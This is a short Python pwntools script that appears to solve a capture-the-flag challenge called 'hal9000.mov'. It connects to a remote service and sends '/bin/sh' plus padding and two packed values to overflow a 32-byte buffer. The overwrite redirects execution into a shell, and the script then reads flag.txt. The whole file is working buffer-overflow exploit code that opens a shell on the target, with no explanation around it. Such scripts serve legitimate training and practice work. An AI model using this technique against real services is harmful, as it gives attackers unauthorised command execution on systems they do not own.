import os
from pwn import *
import time, sys

exe = ELF('./hal9000.mov')
context.binary = exe

buf_size = 32

HOST = os.environ.get('HOST', 'localhost')
PORT = int(os.environ.get('PORT', 25005))

#p = process('./hal9000.mov')
p = remote(HOST, PORT)

p.recvuntil(b':')

payload = b'/bin/sh\x00'

p.sendline(payload + b'A' * (buf_size - len(payload)) + p32(0x6e313233) + p32(0x61646d69))
p.recvuntil(b'GOODBYTE\n', timeout=5)

# The overwrite redirects execution into a system("/bin/sh"); grab the flag.
p.sendline(b'cat flag.txt')
print(p.recvrepeat(2).decode(errors='replace'))
